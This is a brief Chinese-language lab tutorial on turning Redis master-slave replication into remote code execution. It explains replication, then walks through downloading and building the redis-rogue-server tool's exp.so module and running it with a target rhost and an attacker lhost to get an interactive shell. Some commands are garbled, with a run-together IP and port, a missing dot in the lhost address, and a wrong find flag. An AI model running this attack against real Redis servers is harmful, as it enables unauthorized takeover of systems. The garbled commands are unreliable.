# 利用主从复制，利用攻击软件获得 shell

## 1.什么是主从复制

redis 主从复制，是指redis 主机称为 master，redis 从机称为 slave，主机 master 可读可写,从机只能读，主机更新数据，从机会从主机获取更新的数据。

#### 原理:

```
主机一旦更新数据  

rdb文件---->从机 

得到rdb 

文件load内存和主机内容保持一致
```

## 2.主从复制的实现

```
条件:能够互相访问远程redis端口，能够设置主从模式，端口都开放
具体设置:
    bind 0.0.0.0
    后台运行
    保护模式关闭
    关闭防火墙
    
实现主从的步骤
1、Kali(192.168.137.137)启动redis服务，连接自己的 redis 服务info replication 看主从设置 都显示是 master
2、从机(192.168.136.220)启动自己的redis 服务，连接自己的 redis 服务info replication 看主从设置 都显示是 master
3、从机 执行 slaveof 192.168.137.1376379 设置自己为从机，137 为自己的主机设置完毕之后从机执行 inforeplication



Down:
    物理不联通
    版本不同
    非root 运行
    bind0.0.0.0
    没有保护模式开启
    防火墙没关
主机执行 info replication
```

## 3.利用主从复制工具攻击

```bash
攻击工具配置
下载攻击工具脚本地址:https://github.com/n0bodyCN/redis-rogue-server
放入到kali 中，解压缩后生成一个文件夹
Unzip redis-rogue-server-master.zip
再目录下
cd RedisModulessDK/exp/
Make
生成 exp.so
	~/redis-rogue-server-master
	
命令：
	python3 redis-rogue-server.py --rhost 192.168.137.220 -lhost 192.168 137.137 --exp exp.so
	
	i
	whoami
	find / --name redis*
```

